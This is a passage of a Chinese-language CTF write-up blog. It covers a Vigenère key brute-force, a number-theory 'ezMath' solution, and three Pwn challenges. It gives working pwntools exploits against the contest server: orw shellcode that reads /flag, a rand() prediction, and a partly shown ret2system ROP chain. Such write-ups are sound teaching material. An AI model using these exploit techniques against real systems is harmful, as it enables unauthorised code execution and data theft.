</span></span><span class="line"><span class="cl">    <span class="n">key</span><span class="p">,</span> <span class="n">encrypted_flag</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">lower</span><span class="p">(),</span> <span class="n">encrypted_flag</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">decrypted_flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">k_i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">encrypted_flag</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">encrypted_flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isalpha</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="n">decrypted_flag</span> <span class="o">+=</span> <span class="n">encrypted_flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">encrypted_flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">k_i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypted_flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">+</span> <span class="mi">26</span><span class="p">)</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">k_i</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decrypted_flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">known_key_prefix</span> <span class="o">=</span> <span class="s2">&#34;qkxjuk&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">encrypted_flag</span> <span class="o">=</span> <span class="s2">&#34;ieplnp{bhtnr6m3-04bm-41w3-lg78-c040377ys146}&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_regex</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^susctf\{[0-9a-f]</span><span class="si">{8}</span><span class="s2">-([0-9a-f]</span><span class="si">{4}</span><span class="s2">-)</span><span class="si">{3}</span><span class="s2">[0-9a-f]</span><span class="si">{12}</span><span class="s2">\}$&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">26</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">26</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">26</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">26</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">possible_key</span> <span class="o">=</span> <span class="n">known_key_prefix</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">97</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">97</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">97</span> <span class="o">+</span> <span class="n">k</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">97</span> <span class="o">+</span> <span class="n">l</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">decrypted_flag</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_flag</span><span class="p">,</span> <span class="n">possible_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">flag_regex</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">decrypted_flag</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Found a matching key: </span><span class="si">{</span><span class="n">possible_key</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Decrypted flag: </span><span class="si">{</span><span class="n">decrypted_flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p>结果为：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015191937007.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015191937007.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015191937007.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015191937007.png?size=large 2x" sizes="auto" data-title="image-20231015191937007" data-alt="image-20231015191937007" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="0x03-ezmath">0x03 ezMath</h2>
<p>根据(<a href="https://math.stackexchange.com/questions/402537/find-integer-in-the-form-fracabc-fracbca-fraccab"target="_blank" rel="external nofollow noopener noreferrer">https://math.stackexchange.com/questions/402537/find-integer-in-the-form-fracabc-fracbca-fraccab</a>)中的讨论，发现当且仅当n为偶数的时候有解。</p>
<p>这里给出了n &lt;= 10的所有整数解，这里直接使用N=10的情况：</p>
<div class="highlight" id="id-11"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">n=10:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">a=221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">b=269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">c=4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">log2(a+b+c)≈630.265; log10(a+b+c)≈189.729</span></span></code></pre></td></tr></table>
</div>
</div><p>填入后就得到flag：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015194336621.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015194336621.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015194336621.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015194336621.png?size=large 2x" sizes="auto" data-title="image-20231015194336621" data-alt="image-20231015194336621" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<h1 id="pwn">Pwn</h1>
<h2 id="0x01-orw">0x01 orw</h2>
<p>根据题目，大概能猜出是orw类型的题目（只能使用open、read和write）。先checksec：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200748364.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200748364.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200748364.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200748364.png?size=large 2x" sizes="auto" data-title="image-20231015200748364" data-alt="image-20231015200748364" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>只开了Canary，同时发现栈上可以RWX，于是考虑将shellcode直接写入栈上。</p>
<p>ida64打开，第一眼就看到了沙箱：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200904346.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200904346.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200904346.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200904346.png?size=large 2x" sizes="auto" data-title="image-20231015200904346" data-alt="image-20231015200904346" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>再看看溢出点：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200928477.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200928477.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200928477.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200928477.png?size=large 2x" sizes="auto" data-title="image-20231015200928477" data-alt="image-20231015200928477" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>发现直接read了0x100，但是buf在rbp上0x80，可以直接栈溢出。</p>
<p>同时发现最后直接call rax，而rax是buf的地址。那我们这里直接将shellcode读入buf就可以执行。下面是open read write的代码：</p>
<div class="highlight" id="id-12"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">   #open /flag
</span></span><span class="line"><span class="cl">   push 0x67616c66
</span></span><span class="line"><span class="cl">    mov rdi,rsp
</span></span><span class="line"><span class="cl">    xor esi,esi
</span></span><span class="line"><span class="cl">    push 2
</span></span><span class="line"><span class="cl">    pop rax
</span></span><span class="line"><span class="cl">    syscall
</span></span><span class="line"><span class="cl">   #read(rax,rsp,100h)
</span></span><span class="line"><span class="cl">    mov rdi,rax
</span></span><span class="line"><span class="cl">    mov rsi,rsp
</span></span><span class="line"><span class="cl">    mov edx,0x100
</span></span><span class="line"><span class="cl">    xor eax,eax
</span></span><span class="line"><span class="cl">    syscall
</span></span><span class="line"><span class="cl">   #write(1,rsp,100h)
</span></span><span class="line"><span class="cl">    mov edi,1
</span></span><span class="line"><span class="cl">    mov rsi,rsp
</span></span><span class="line"><span class="cl">    push 1
</span></span><span class="line"><span class="cl">    pop rax
</span></span><span class="line"><span class="cl">    syscall</span></span></code></pre></td></tr></table>
</div>
</div><p>直接发送shellcode即可。</p>
<p>exp：</p>
<div class="highlight" id="id-13"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ae64</span> <span class="kn">import</span> <span class="n">AE64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">    push 0x67616c66
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdi,rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">    xor esi,esi
</span></span></span><span class="line"><span class="cl"><span class="s1">    push 2
</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rax
</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdi,rax
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rsi,rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov edx,0x100
</span></span></span><span class="line"><span class="cl"><span class="s1">    xor eax,eax
</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov edi,1
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rsi,rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">    push 1
</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rax
</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;game.ctf.seusus.com&#39;</span><span class="p">,</span><span class="mi">28380</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(r)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;shellcode:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="0x02-random">0x02 random</h2>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202030014.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202030014.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202030014.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202030014.png?size=large 2x" sizes="auto" data-title="image-20231015202030014" data-alt="image-20231015202030014" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>发现保护全开，一看就不像是栈溢出的题目。</p>
<p>ida64，发现：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202136006.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202136006.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202136006.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202136006.png?size=large 2x" sizes="auto" data-title="image-20231015202136006" data-alt="image-20231015202136006" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>我们只需要得到v5，再和-889275714求异或即可。</p>
<p>发现v5是一个随机数，但是它甚至没有设置种子，那么我们只需要和题目链接到同一个libc中，取出rand()的结果就可以。</p>
<p>如何取出rand()，当然是用ctypes，可以直接使用C语言中的函数，我们取出rand后将其和-889275714异或后发送即可（由于没设种子，这题可以不用pwntool）</p>
<p>exp:</p>
<div class="highlight" id="id-14"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;splitw&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./random&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">cdll</span><span class="o">.</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s1">&#39;libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;game.ctf.seusus.com&#39;</span><span class="p">,</span><span class="mi">32552</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#r = elf.process()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">v5</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">rand</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;mind?&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">^</span> <span class="o">-</span><span class="mi">889275714</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="0x03-bof">0x03 bof</h2>
<blockquote>
<p>buffer overflow</p>
</blockquote>
<p>首先checksec：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202641500.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202641500.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202641500.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202641500.png?size=large 2x" sizes="auto" data-title="image-20231015202641500" data-alt="image-20231015202641500" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>只开了栈不可执行，没什么特别的。</p>
<p>ida进，发现溢出点：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202820656.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202820656.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202820656.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202820656.png?size=large 2x" sizes="auto" data-title="image-20231015202820656" data-alt="image-20231015202820656" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>非常朴实无华，这时候就去找函数了，发现有system也有/bin/sh，于是直接ret2system了。这里64位要注意参数放在rdi里，还有栈平衡的问题。</p>
<p>栈平衡很简单，在ROP链前面加上一个ret就行了，rdi的话得去ROPgadget：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015203536561.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015203536561.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015203536561.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015203536561.png?size=large 2x" sizes="auto" data-title="image-20231015203536561" data-alt="image-20231015203536561" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>找到了。这里顺便把ret的地址记一下，栈平衡的时候要用。</p>
<p>exp:</p>
<div class="highlight" id="id-15"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;splitw&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./bof&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;game.ctf.seusus.com&#39;</span><span class="p">,</span><span class="mi">29689</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#r = elf.process()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x601048</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400793</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40053e</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#溢出0x20 + 8</span>
